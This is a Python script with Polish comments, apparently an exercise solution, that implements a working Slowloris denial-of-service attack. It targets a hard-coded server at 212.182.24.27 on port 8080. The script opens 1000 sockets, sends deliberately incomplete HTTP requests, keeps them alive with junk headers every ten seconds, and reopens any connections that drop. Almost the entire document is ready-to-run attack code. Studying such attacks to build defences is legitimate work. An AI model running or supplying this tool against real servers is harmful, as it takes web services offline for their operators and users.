"""
Znając założenia ataku Slowloris, napisz program klienta - atakującego, który wykona atak Slowloris na
serwer WWW działający pod adresem 212.182.24.27 na porcie TCP 8080. Jakich nagłówków HTTP
należy użyć?

- Host - wymagany w HTTP/1.1, określa nazwę hosta, do którego kierowane jest żądanie
- User-Agent - podszywanie się pod przeglądarkę (np. Mozilla/5.0)
- Connection - keep-alive, żeby utrzymać połączenie otwarte
- X-a - dowolny, bezsensowny nagłówek, który będzie wysyłany co SLEEP_INTERVAL sekund, aby utrzymać sesję przy życiu (np. X-a: 1234)
"""

import socket
import time
import threading
import random
import logging

# Konfiguracja logowania zdarzeń do konsoli
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)

# --- Parametry ataku ---
TARGET_HOST    = "212.182.24.27"
TARGET_PORT    = 8080
NUM_SOCKETS    = 1000      # liczba gniazd do otwarcia
SLEEP_INTERVAL = 10        # czas (s) między kolejnymi wysyłkami nagłówka
SOCKET_TIMEOUT = 4         # timeout (s) przy nawiązywaniu połączenia

# Blokada do bezpiecznego dostępu do listy gniazd z wielu wątków
lock = threading.Lock()


def create_socket() -> socket.socket | None:
    # Tworzy gniazdo TCP i wysyła nagłówki otwierające żądanie HTTP GET.
    # Żądanie jest celowo niekompletne - brakuje końcowej pustej linii CRLF,
    # więc serwer czeka na resztę nagłówków, blokując wątek obsługi.
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.connect((TARGET_HOST, TARGET_PORT))

        # Linia żądania + podstawowe nagłówki (bez kończącego \r\n\r\n)
        sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode("utf-8"))
        sock.send(f"Host: {TARGET_HOST}\r\n".encode("utf-8"))
        sock.send(b"User-Agent: Mozilla/5.0\r\n")
        sock.send(b"Accept: text/html,application/xhtml+xml\r\n")
        sock.send(b"Accept-Language: pl,en;q=0.9\r\n")
        sock.send(b"Connection: keep-alive\r\n")
        # Celowo NIE wysyłamy pustej linii \r\n – serwer czeka dalej

        return sock
    except socket.error as e:
        logging.warning(f"Nie udało się otworzyć gniazda: {e}")
        return None


def send_keep_alive_header(sock: socket.socket) -> bool:
    # Wysyła jeden dodatkowy, bezsensowny nagłówek HTTP, aby utrzymać
    # połączenie przy życiu i nie dopuścić do zamknięcia go przez serwer.
    try:
        # Nagłówek X-a: b – poprawny składniowo, ale ignorowany przez serwer;
        # jego jedynym celem jest podtrzymanie sesji TCP
        sock.send(f"X-a: {random.randint(1, 9999)}\r\n".encode("utf-8"))
        return True
    except socket.error:
        return False


def attack():
    """Główna pętla ataku Slowloris:
    1. Otwiera NUM_SOCKETS połączeń z niekompletnymi żądaniami.
    2. Co SLEEP_INTERVAL sekund dosyła nagłówek podtrzymujący.
    3. Zamknięte gniazda zastępuje nowymi."""

    sockets: list[socket.socket] = []

    # --- Faza 1: budowanie puli gniazd ---
    logging.info(f"Otwieranie {NUM_SOCKETS} połączeń z {TARGET_HOST}:{TARGET_PORT}...")
    for _ in range(NUM_SOCKETS):
        sock = create_socket()
        if sock:
            sockets.append(sock)

    logging.info(f"Otwarto {len(sockets)} połączeń. Rozpoczynam pętlę podtrzymującą.")

    # --- Faza 2: nieskończona pętla podtrzymująca ---
    while True:
        logging.info(f"Aktywne gniazda: {len(sockets)} - wysyłam nagłówki keep-alive...")

        dead_sockets = []

        for sock in sockets:
            alive = send_keep_alive_header(sock)
            if not alive:
                # Gniazdo zostało zamknięte przez serwer lub sieć
                dead_sockets.append(sock)

        # Usuwamy martwe gniazda
        for sock in dead_sockets:
            sockets.remove(sock)
            try:
                sock.close()
            except Exception:
                pass

        # Uzupełniamy pulę do NUM_SOCKETS nowymi połączeniami
        missing = NUM_SOCKETS - len(sockets)
        if missing > 0:
            logging.info(f"Odbudowuję {missing} zamkniętych połączeń...")
            for _ in range(missing):
                sock = create_socket()
                if sock:
                    sockets.append(sock)

        # Czekamy przed kolejną rundą dosyłania nagłówków
        logging.info(f"Czekam {SLEEP_INTERVAL} s przed następną rundą...")
        time.sleep(SLEEP_INTERVAL)


if __name__ == "__main__":
    attack()